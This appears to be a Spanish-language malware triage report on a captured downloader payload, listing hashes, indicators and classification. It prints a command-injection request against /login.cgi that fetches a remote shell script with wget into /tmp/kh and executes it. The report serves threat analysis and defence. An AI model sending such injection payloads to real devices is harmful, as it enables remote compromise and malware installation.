# 🧬 Payload Analysis

`a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1`

## 📌 Resumen

Texto ASCII de 203 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxp://109.104.153.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh /tmp/kh'$`
2. `wget hxxp://109.104.153.XXX/sh -O -> /tmp/kh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1.md](../../../../../malware-like/oraculo/downloader/a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:19:44.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1`
- **SHA1:** `058500cc23bb72749246c6e5d4d02b48fdff0270`
- **MD5:** `2da634030194dd2164ef61ac0b2e0bc3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 203 B |
| Entropía | 5.23 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /login.cgi?cli=aa%20aa%27;wget%20http://109.104.153.XXX/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://109.104.153.XXX/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ | strings |
| ip | 109.104.153.XXX | static_analysis |
| command | GET /login.cgi?cli=aa%20aa%27;wget%20http://109.104.153.XXX/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1 | strings |
| hash | a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1 | static_analysis |
| ip | 219.79.105.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
